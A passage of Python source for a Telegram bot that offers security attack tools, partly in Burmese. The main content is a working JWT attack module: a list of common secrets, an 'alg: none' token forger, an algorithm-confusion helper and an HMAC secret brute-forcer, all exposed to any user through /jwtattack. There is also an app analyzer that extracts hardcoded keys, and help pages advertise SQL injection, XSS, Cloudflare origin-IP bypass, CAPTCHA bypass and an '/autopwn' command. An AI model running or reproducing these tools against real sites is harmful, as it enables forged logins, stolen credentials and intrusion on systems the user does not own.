            "domain": domain, "scanned_at": datetime.now().isoformat(),
            "wordlist_size": len(wordlist), "raw_words": len(raw_words),
            "found": found
        }, indent=2))

    zip_buf.seek(0)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buf,
            filename=f"smartfuzz_{safe_d}_{ts}.zip",
            caption=(
                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
                f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
                "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("SmartFuzz export error: %s", e)


# ══════════════════════════════════════════════════
# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
# ══════════════════════════════════════════════════

import base64 as _b64

_JWT_COMMON_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","test",
    "changeme","mysecret","your-256-bit-secret","your-secret-key",
    "secret_key","jwt_secret","app_secret","supersecret","private",
    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
    "your-secret","secretkey","jwtpassword","pass","1234","12345",
    "123456789","qwerty123","iloveyou","princess","rockyou","football",
    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
    "secret123","jwt-secret","token-secret","api-secret","app-key",
    "HS256","RS256","none","null","undefined","example",
]

def _jwt_decode_payload(token: str) -> dict:
    """Decode JWT header + payload without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
    try:
        def _b64_decode(s: str) -> dict:
            # Correct padding: -len(s) % 4 gives 0 when already aligned
            s = s.replace('-', '+').replace('_', '/')
            s += '=' * (-len(s) % 4)
            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
        header  = _b64_decode(parts[0])
        payload = _b64_decode(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def _jwt_none_attack(token: str) -> dict:
    """None algorithm bypass — forge unsigned token."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        forged_header = dict(header_dec)
        forged_header["alg"] = "none"
        def _b64e(d: dict) -> str:
            return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
        forged = f"{_b64e(forged_header)}.{parts[1]}."
        return {
            "success": True,
            "original_alg": orig_alg,
            "forged_token":  forged,
            "method": "none_alg_bypass",
            "note": "Signature removed — send with empty sig. Some servers accept this."
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_alg_confusion(token: str) -> dict:
    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        if orig_alg == "RS256":
            confused = dict(header_dec)
            confused["alg"] = "HS256"
            def _b64e(d: dict) -> str:
                return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
            confused_header = _b64e(confused)
            note = (
                "RS256→HS256 confusion: Change alg to HS256 then sign with public key as secret.\n"
                "Tool: python-jwt or jwt_tool.py\n"
                "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
            )
            return {"success": True, "original_alg": "RS256", "target_alg": "HS256",
                    "confused_header": confused_header, "method": "alg_confusion", "note": note}
        return {"success": False, "note": f"Alg is `{orig_alg}` (RS256 only for this attack)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
    """Brute-force JWT HMAC secret from wordlist."""
    import hmac as _hmac
    parts = token.split('.')
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}

    target_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    # Detect algorithm
    header_info = _jwt_decode_payload(token).get("header", {})
    alg = header_info.get("alg", "HS256")
    if alg not in target_algs:
        return {"cracked": False, "error": f"Algorithm `{alg}` not brute-forceable (needs HMAC)"}

    hash_fn   = target_algs[alg]
    msg_bytes = f"{parts[0]}.{parts[1]}".encode()

    # Decode target signature
    sig_pad = parts[2].replace('-', '+').replace('_', '/')
    sig_pad += '=' * (-len(sig_pad) % 4)
    try:
        target_sig = _b64.b64decode(sig_pad)
    except Exception:
        return {"cracked": False, "error": "Cannot decode signature"}

    wl = wordlist or _JWT_COMMON_SECRETS
    total = len(wl)

    for i, secret in enumerate(wl):
        if progress_cb and i % 50 == 0:
            progress_cb(f"🔑 Brute-force: `{i}/{total}` tried")
        try:
            computed = _hmac.HMAC(secret.encode(), msg_bytes, hash_fn).digest()
            if computed == target_sig:
                return {"cracked": True, "secret": secret, "alg": alg, "tried": i + 1}
        except Exception:
            continue

    return {"cracked": False, "tried": total, "alg": alg}


async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/jwtattack <token>`\n\n"
            "🎟️ *JWT Attack Phases:*\n\n"
            "① *Decode* — Header + Payload reveal\n"
            "   Algorithm, expiry, user roles, claims\n\n"
            "② *None Algorithm Bypass*\n"
            "   `alg: none` — unsigned token forge\n\n"
            "③ *Algorithm Confusion*\n"
            "   RS256 → HS256 confusion attack\n\n"
            "④ *Secret Key Brute-force*\n"
            f"   `{len(_JWT_COMMON_SECRETS)}` common secrets + dictionary\n\n"
            "💡 `/extract <url>` နဲ့ token ရှာပြီး ဒီမှာ paste ပါ",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    token = context.args[0].strip()

    # URL pass လုပ်မိရင် ကောင်းကောင်း error ပြ
    if token.startswith('http://') or token.startswith('https://'):
        await update.effective_message.reply_text(
            "❌ *URL မဟုတ်ဘဲ JWT Token ထည့်ပါ*\n\n"
            "JWT format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx`\n\n"
            "💡 Token ကိုရှာဖို့ `/extract <url>` သုံးနိုင်သည်",
            parse_mode='Markdown'
        )
        return

    # Basic JWT format check (3 parts, each part is base64url)
    if token.count('.') != 2:
        await update.effective_message.reply_text(
            "❌ Valid JWT မဟုတ်ပါ\n"
            "JWT format: `xxxxx.yyyyy.zzzzz` (dot 3 ပိုင်း ပါရမည်)",
            parse_mode='Markdown'
        )
        return

    parts = token.split('.')
    for i, part in enumerate(parts[:2]):
        if len(part) < 4:
            await update.effective_message.reply_text(
                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
                parse_mode='Markdown'
            )
            return

    msg = await update.effective_message.reply_text(
        "🎟️ *JWT Attacker Running...*\n\n"
        "① Decoding...\n② None attack...\n③ Alg confusion...\n④ Brute-forcing...\n⏳",
        parse_mode='Markdown'
    )

    # ── Phase 1: Decode ──────────────────────────
    decoded = _jwt_decode_payload(token)
    if "error" in decoded:
        await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
        return

    header  = decoded.get("header", {})
    payload = decoded.get("payload", {})
    alg     = header.get("alg", "unknown")

    # Format payload nicely
    def _fmt_payload(p: dict) -> str:
        lines = []
        important_keys = ['sub','iss','aud','exp','iat','nbf','role','roles',
                          'user_id','uid','email','username','admin','scope',
                          'permissions','type','jti']
        for k in important_keys:
            if k in p:
                v = p[k]
                if k in ('exp','iat','nbf') and isinstance(v, int):
                    try:
                        from datetime import datetime as _dt
                        v = f"{v} ({_dt.utcfromtimestamp(v).strftime('%Y-%m-%d %H:%M UTC')})"
                    except Exception:
                        pass
                lines.append(f"  `{k}`: `{str(v)[:80]}`")
        remaining = {k: v for k, v in p.items() if k not in important_keys}
        for k, v in list(remaining.items())[:10]:
            lines.append(f"  `{k}`: `{str(v)[:60]}`")
        return "\n".join(lines) or "  (empty)"

    payload_str = _fmt_payload(payload)

    # ── Phase 2: None attack ─────────────────────
    none_res = _jwt_none_attack(token)

    # ── Phase 3: Alg confusion ───────────────────
    alg_res = _jwt_alg_confusion(token)

    # ── Phase 4: Brute-force (in thread) ─────────
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🎟️ *JWT Attacker*\n\n🔑 {txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        bf_res = await asyncio.to_thread(
            _jwt_brute_force, token, None, lambda t: progress_q.append(t)
        )
    except Exception as e:
        bf_res = {"cracked": False, "error": str(e)}
    finally:
        prog.cancel()

    # ── Build report ─────────────────────────────
    lines = [
        "🎟️ *JWT Attack Report*",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        f"*① Decoded Token:*",
        f"  Algorithm: `{alg}`",
        f"  Header: `{json.dumps(header, separators=(',',':'))[:100]}`",
        f"",
        f"*📋 Payload:*",
        payload_str,
        "",
    ]

    # None attack result
    lines.append("*② None Algorithm Bypass:*")
    if none_res.get("success"):
        forged = none_res['forged_token']
        lines.append(f"  ✅ *VULNERABLE — unsigned token forged!*")
        lines.append(f"  Original alg: `{none_res['original_alg']}`")
        lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
        lines.append(f"  _{none_res.get('note','')}_")
    else:
        lines.append(f"  ⚪ Not applicable or failed")
    lines.append("")

    # Alg confusion result
    lines.append("*③ Algorithm Confusion:*")
    if alg_res.get("success"):
        lines.append(f"  🟠 RS256 → HS256 confusion possible!")
        lines.append(f"  _{alg_res.get('note','')[:150]}_")
    else:
        lines.append(f"  ⚪ {alg_res.get('note', 'Not applicable')}")
    lines.append("")

    # Brute-force result
    lines.append("*④ Secret Key Brute-force:*")
    if bf_res.get("cracked"):
        secret = bf_res['secret']
        lines.append(f"  🔴 *SECRET FOUND!*")
        lines.append(f"  Key: `{secret}`")
        lines.append(f"  Algorithm: `{bf_res.get('alg','?')}`")
        lines.append(f"  Tried: `{bf_res.get('tried',0)}` passwords")
    elif "error" in bf_res:
        lines.append(f"  ⚪ `{bf_res['error']}`")
    else:
        lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
        lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized security research only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # Export full JSON report
    import io
    full_report = {
        "token": token,
        "decoded": decoded,
        "none_attack": none_res,
        "alg_confusion": alg_res,
        "brute_force": bf_res,
        "analyzed_at": datetime.now().isoformat(),
    }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_buf = io.BytesIO(json.dumps(full_report, indent=2, default=str).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=report_buf,
            filename=f"jwt_report_{ts}.json",
            caption="🎟️ *JWT Full Report* — JSON export",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("JWT export error: %s", e)


# ══════════════════════════════════════════════════
# 🤖  BOT — USER COMMANDS
# ══════════════════════════════════════════════════


async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mystats — Detailed personal statistics"""
    uid = update.effective_user.id
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)

    lim      = get_limit(db, u)
    dls      = u.get("downloads", [])
    total_mb = sum(d.get("size_mb", 0) for d in dls)
    success  = sum(1 for d in dls if d.get("status") == "success")
    failed   = len(dls) - success

    bar = pbar(u["count_today"], lim if lim > 0 else max(u["count_today"], 1))

    await update.effective_message.reply_text(
        "📊 *My Statistics*\n\n"
        "👤 *%s*\n"
        "🆔 `%d`\n\n"
        "📅 *Today:*\n"
        "`%s`\n"
        "Used: `%d` / `%s`\n\n"
        "📦 *All Time:*\n"
        "Downloads: `%d` total\n"
        "✅ Success: `%d`  ❌ Failed: `%d`\n"
        "💾 Data: `%.1f MB`" % (
            u["name"], uid,
            bar, u["count_today"], "∞" if lim == 0 else str(lim),
            u["total_downloads"], success, failed, total_mb,
        ),
        parse_mode="Markdown"
    )





async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    User က APK/IPA/ZIP/JAR upload လုပ်ရင် auto-detect ပြီး analyze လုပ်
    """
    doc = update.message.document
    if not doc:
        return

    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    # ── Force join check ─────────────────────────
    if not await check_force_join(update, context):
        return

    # ── File type check ──────────────────────────
    fname    = doc.file_name or ""
    ext      = os.path.splitext(fname.lower())[1]
    fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0

    if ext not in _APP_EXTS:
        # Not an app file — ignore silently
        return

    # ── Size limit ───────────────────────────────
    if fsize_mb > APP_MAX_MB:
        await update.message.reply_text(
            f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
            f"📏 Max: `{APP_MAX_MB}MB`",
            parse_mode='Markdown'
        )
        return

    # ── Rate limit ───────────────────────────────
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    file_type = _APP_EXTS.get(ext, ext.upper())
    msg = await update.message.reply_text(
        f"📱 *{file_type} Detected!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 `{fname}`\n"
        f"💾 `{fsize_mb:.1f} MB`\n\n"
        f"⬇️ Downloading from Telegram...",
        parse_mode='Markdown'
    )

    # ── Download file from Telegram ──────────────
    work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
    os.makedirs(work_dir, exist_ok=True)
    safe_name = re.sub(r'[^\w\.\-]', '_', fname)
    save_path = os.path.join(work_dir, safe_name)

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(save_path)
    except Exception as e:
        await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
        return

    # ── Save path for /appassets command ─────────
    async with db_lock:
        db2 = _load_db_sync()
        u2  = get_user(db2, uid, uname)
        u2["last_uploaded_app"] = save_path
        _save_db_sync(db2)

    await msg.edit_text(
        f"📱 *{file_type} — `{fname}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
        f"🔍 Phase 1: Text/Source scanning...\n"
        f"📦 Phase 2: Binary string extraction...\n"
        f"🔑 Phase 3: Secret/key detection...\n\n"
        f"⏳ Analyzing...",
        parse_mode='Markdown'
    )

    # ── Progress tracking ─────────────────────────
    prog_q = []
    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if prog_q:
                txt = prog_q[-1]; prog_q.clear()
                try:
                    await msg.edit_text(
                        f"📱 *Analyzing `{fname}`*\n\n{txt}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass

    prog_task = asyncio.create_task(_prog_loop())

    try:
        result = await asyncio.to_thread(
            analyze_app_file, save_path, lambda t: prog_q.append(t)
        )
    except Exception as e:
        prog_task.cancel()
        await msg.edit_text(f"❌ Analysis error: `{type(e).__name__}`\n`{str(e)[:100]}`",
                            parse_mode='Markdown')
        try: os.remove(save_path)
        except: pass
        return
    finally:
        prog_task.cancel()

    # ── Cleanup downloaded file ───────────────────
    try:
        os.remove(save_path)
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ══ Build result report ═══════════════════════
    app_info = result.get("app_info", {})
    urls     = result.get("urls", [])
    api_paths= result.get("api_paths", [])
    ws_urls  = result.get("ws_urls", [])
    secrets  = result.get("secrets", {})
    src_files= result.get("source_files", [])
    stats    = result.get("stats", {})
    errors   = result.get("errors", [])

    # ── Platform badge ────────────────────────────
    platform = app_info.get("platform", "")
    plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")

    lines = [
        f"📱 *App Analysis — `{fname}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
        f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
        f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
        f"🔌 WebSocket: `{stats.get('ws_urls',0)}` | 🔑 Secret types: `{stats.get('secret_types',0)}`",
        "",
    ]

    # App Info
    if app_info:
        lines.append(f"*{'🤖 Android' if platform == 'Android' else '🍎 iOS'} App Info:*")
        pkg = app_info.get("package") or app_info.get("bundle_id", "")
        if pkg:
            lines.append(f"  📦 `{pkg}`")
        perms = app_info.get("permissions", [])[:8]
        if perms:
            lines.append(f"  🔐 Permissions: `{', '.join(perms[:5])}`{'...' if len(perms)>5 else ''}")
        url_schemes = app_info.get("url_schemes", [])
        if url_schemes:
            lines.append(f"  🔗 URL Schemes: `{'`, `'.join(url_schemes[:4])}`")
        # Meta-data with potential API keys
        meta = app_info.get("meta_data", {})
        interesting_meta = {k: v for k, v in meta.items()
                           if any(kw in k.lower() for kw in
                                  ['api', 'key', 'secret', 'token', 'firebase',
                                   'google', 'facebook', 'stripe', 'url', 'host'])}
        if interesting_meta:
            lines.append(f"  🗝 Meta-data keys ({len(interesting_meta)}):")
            for k, v in list(interesting_meta.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        # iOS plist keys
        plist_keys = app_info.get("keys", {})
        if plist_keys:
            lines.append(f"  🗝 Config keys ({len(plist_keys)}):")
            for k, v in list(plist_keys.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        lines.append("")

    # Secrets found
    if secrets:
        lines.append(f"*🔑 Potential Secrets Found ({len(secrets)} types):*")
        for name, count in sorted(secrets.items(), key=lambda x: -x[1]):
            risk = "🔴" if name in ('AWS Key', 'AWS Secret', 'Private Key', 'Stripe Key',
                                     'Hardcoded Pass', 'JWT Token') else "🟡"
            lines.append(f"  {risk} `{name}` × {count}")
        lines.append("")

    # API paths
    if api_paths:
        lines.append(f"*🛤 API Paths ({len(api_paths)}):*")
        for p in api_paths[:15]:
            lines.append(f"  🟢 `{p}`")
        if len(api_paths) > 15:
            lines.append(f"  _...and {len(api_paths)-15} more in JSON report_")
        lines.append("")

    # Full URLs (top domains)
    if urls:
        # Group by domain
        domain_map = {}
        for u in urls:
            try:
                d = urlparse(u).netloc
                domain_map.setdefault(d, []).append(u)
            except Exception:
                pass
        lines.append(f"*🌐 Hosts Found ({len(domain_map)} unique):*")
        for domain, durls in sorted(domain_map.items(), key=lambda x: -len(x[1]))[:10]:
            lines.append(f"  🔵 `{domain}` ({len(durls)} URLs)")
        lines.append("")

    # WebSocket
    if ws_urls:
        lines.append(f"*🔌 WebSocket URLs ({len(ws_urls)}):*")
        for w in ws_urls[:5]:
            lines.append(f"  🟣 `{w[:80]}`")
        lines.append("")

    # Top source files
    if src_files:
        lines.append(f"*📄 Hot Source Files ({len(src_files)}):*")
        for sf in src_files[:8]:
            fname_short = sf["file"].split("/")[-1]
            tags = []
            if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
            if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
        lines.append("")

    if errors:
        lines.append(f"⚠️ _Errors: {len(errors)}_")

    lines.append("⚠️ _Passive analysis only — no exploitation_")

    report_text = "\n".join(lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.message.reply_text(report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report ───────────────────
    try:
        safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path  = os.path.join(APP_ANALYZE_DIR, f"app_{safe_fname}_{ts}.json")

        export = {
            "filename":    fname,
            "file_type":   result["file_type"],
            "file_size_mb":result["file_size_mb"],
            "analyzed_at": datetime.now().isoformat(),
            "app_info":    app_info,
            "stats":       stats,
            "api_paths":   api_paths,
            "urls":        urls,
            "ws_urls":     ws_urls,
            "secrets_found": {k: f"×{v}" for k, v in secrets.items()},
            "source_files":  src_files,
            "errors":        errors[:20],
        }
        with open(json_path, 'w', encoding='utf-8') as jf:
            json.dump(export, jf, ensure_ascii=False, indent=2)

        cap = (
            f"📦 *App Analysis Report*\n"
            f"📱 `{fname}`\n"
            f"🌐 `{stats.get('unique_urls',0)}` URLs | "
            f"🛤 `{stats.get('api_paths',0)}` API paths | "
            f"🔑 `{stats.get('secret_types',0)}` secret types"
        )
        with open(json_path, 'rb') as jf:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=jf,
                filename=f"app_{safe_fname}_{ts}.json",
                caption=cap,
                parse_mode='Markdown'
            )
        os.remove(json_path)

    except Exception as e:
        logger.warning("App JSON export error: %s", e)



async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    async with db_lock:
        db2 = _load_db_sync()
        u   = get_user(db2, uid, uname)
        reset_daily(u)
        _save_db_sync(db2)

    is_adm    = uid in ADMIN_IDS
    js_icon   = "✅" if PUPPETEER_OK else "❌"
    used      = u["count_today"]
    lim       = get_limit(db2, u)
    lim_str   = "∞" if lim == 0 else str(lim)

    kb_rows = [
        [
            InlineKeyboardButton("📥 Download",   callback_data="help_dl"),
            InlineKeyboardButton("🔍 Scanner",    callback_data="help_scan"),
        ],
        [
            InlineKeyboardButton("🕵️ Recon",      callback_data="help_recon"),
            InlineKeyboardButton("🔎 Discover",   callback_data="help_discover"),
        ],
        [
            InlineKeyboardButton("🔔 Monitor",    callback_data="help_monitor"),
            InlineKeyboardButton("📊 My Stats",   callback_data="help_account"),
        ],
        [
            InlineKeyboardButton("🆕 V20 Security", callback_data="help_v20"),
            InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
        ],
    ]
    if is_adm:
        kb_rows.append([InlineKeyboardButton("👑 Admin", callback_data="help_admin")])

    await update.effective_message.reply_text(
        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
        f"🌐 *Website Downloader Bot v28.0*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📅 Today: `{used}/{lim_str}` downloads used\n"
        f"⚡ JS Render: {js_icon} | 🔒 SSRF Protected\n\n"
        f"🆕 *V20:* `/sqli` `/xss` `/techstack` `/cloudcheck`\n"
        f"      `/paramfuzz` `/autopwn` `/bulkscan`\n\n"
        f"_Category ရွေးပြီး commands ကြည့်ပါ ↓_",
        reply_markup=InlineKeyboardMarkup(kb_rows),
        parse_mode='Markdown'
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid    = update.effective_user.id
    is_adm = uid in ADMIN_IDS

    kb_rows = [
        [
            InlineKeyboardButton("📥 Download",   callback_data="help_dl"),
            InlineKeyboardButton("🔍 Scanner",    callback_data="help_scan"),
        ],
        [
            InlineKeyboardButton("🕵️ Recon",      callback_data="help_recon"),
            InlineKeyboardButton("🔎 Discover",   callback_data="help_discover"),
        ],
        [
            InlineKeyboardButton("🔔 Monitor",    callback_data="help_monitor"),
            InlineKeyboardButton("📊 Account",    callback_data="help_account"),
        ],
        [
            InlineKeyboardButton("🆕 V20 Security", callback_data="help_v20"),
            InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
        ],
        [
            InlineKeyboardButton("🛠️ Tools",        callback_data="help_tools"),
        ],
    ]
    if is_adm:
        kb_rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")])

    await update.effective_message.reply_text(
        "📖 *Help — Category ရွေးပါ*",
        reply_markup=InlineKeyboardMarkup(kb_rows),
        parse_mode='Markdown'
    )


# ──────────────────────────────────────────────────
# Help category callback handler
# ──────────────────────────────────────────────────

_HELP_PAGES = {
    "help_dl": (
        "📥 *Download*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/dl <url>`\n"
        "  └ Mode ရွေးဖို့ keyboard ပေါ်လာမယ်\n\n"
        "`/dl <url> full`   — Full site crawl\n"
        "`/dl <url> js`     — JS/React/Vue render\n"
        "`/dl <url> jsful`  — JS + Full site\n\n"
        "`/resume <url>`  — ကျသွားလျှင် ဆက်\n"
        "`/stop`          — Download ရပ်ရန်\n\n"
        "💡 50MB+ → auto split & send"
    ),
    "help_scan": (
        "🔍 *Security Scanner*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/scan <url>`          — Vuln scan (default)\n"
        "`/scan <url> fuzz`     — Path & param fuzzer\n"
        "`/scan <url> smart`    — Context-aware fuzzer\n"
        "`/scan <url> bypass`   — 403 bypass (50+ methods)\n\n"
        "💡 Catch-all detection ပါဝင်သည်"
    ),
    "help_recon": (
        "🕵️ *Recon*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/recon <url>`           — Full recon\n"
        "`/recon <url> tech`      — Tech stack\n"
        "`/recon <url> headers`   — Security headers\n"
        "`/recon <url> whois`     — WHOIS / IP info\n"
        "`/recon <url> cookies`   — Cookie flags\n"
        "`/recon <url> robots`    — robots.txt\n"
        "`/recon <url> links`     — Link extractor\n\n"
        "💡 `all` mode = tech + headers + whois"
    ),
    "help_discover": (
        "🔎 *Discovery*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/discover <url>`           — API + Subs\n"
        "`/discover <url> api`       — API endpoints\n"
        "`/discover <url> secrets`   — Secret/key scanner\n"
        "`/discover <url> subs`      — Subdomain enum\n\n"
        "💡 Secrets: AWS, JWT, Stripe, GitHub tokens စစ်"
    ),
    "help_monitor": (
        "🔔 *Page Monitor*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/monitor add <url> [min] [label]`\n"
        "  └ Page ပြောင်းရင် alert ပို့မည်\n"
        "  └ interval = minutes (default 30)\n\n"
        "`/monitor list`   — ကြည့်ရန်\n"
        "`/monitor del <n>`— ဖျက်ရန်\n"
        "`/monitor clear`  — အားလုံးဖျက်\n\n"
        "💡 Max 10 monitors"
    ),
    "help_account": (
        "📊 *My Account*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/status`   — Daily limit + usage bar\n"
        "`/history`  — Download log (last 10)\n"
        "`/mystats`  — Total downloads + stats\n"
        "`/stop`     — Download ရပ်ရန်"
    ),
    "help_app": (
        "📱 *App Analyzer*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Chat ထဲ file drop ရုံသာ — auto analyze\n\n"
        "Supported: APK / IPA / ZIP / JAR / AAB\n\n"
        "Extracts:\n"
        "  • API endpoints & domains\n"
        "  • Hardcoded secrets & keys\n"
        "  • AndroidManifest / Info.plist\n"
        "  • Permission risk analysis\n"
        "  • DEX string extraction\n\n"
        "`/appassets` — Asset extractor"
    ),
    "help_v20": (
        "🆕 *V20 — Advanced Security Tools*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔍 *Tech Fingerprint*\n"
        "`/techstack <url>`\n"
        "  └ 200+ signatures (CMS, framework, WAF, CDN)\n"
        "  └ PHP/WordPress exact version detection\n\n"
        "💉 *Injection Testing*\n"
        "`/sqli <url?param=1>`\n"
        "  └ Error + Boolean + Time-based SQLi\n"
        "  └ MySQL / PostgreSQL / MSSQL / Oracle\n\n"
        "`/xss <url?q=test>`\n"
        "  └ Reflected XSS (20 payloads)\n"
        "  └ DOM sink analysis + Form fields\n\n"
        "☁️ *CDN / Real IP*\n"
        "`/cloudcheck example.com`\n"
        "  └ MX records + subdomains + passive DNS\n"
        "  └ Cloudflare real IP bypass\n\n"
        "🔬 *Parameter Discovery*\n"
        "`/paramfuzz <url> [get|post]`\n"
        "  └ 300+ params | Arjun-style batch testing\n\n"
        "🤖 *Auto Pentest*\n"
        "`/autopwn <url>`\n"
        "  └ 7 phases: Tech→Fuzz→Secrets→SQLi→XSS→Params→Report\n"
        "  └ JSON report auto-export\n\n"
        "📋 *Bulk Scan*\n"
        "`/bulkscan` + .txt file upload\n"
        "  └ Max 50 URLs | vuln / tech / recon modes\n"
        "  └ Progress bar + JSON summary report"
    ),
    "help_tools": (
        "🛠️ *Standalone Tools*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/screenshot <url>` — Page screenshot (Puppeteer)\n"
        "`/antibot <url>`    — CF/captcha bypass\n"
        "`/jwtattack <token>`— JWT decode & crack"
    ),
    "help_admin": (
        "👑 *Admin Commands*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/admin`                  — Admin panel\n"
        "`/sys`                    — Storage status\n"
        "`/sys clean`              — Cleanup files\n"
        "`/sys logs [n]`           — View logs\n\n"
        "`/adminset limit <n>`     — Daily limit (0=∞)\n"
        "`/adminset pages <n>`     — Max crawl pages\n"
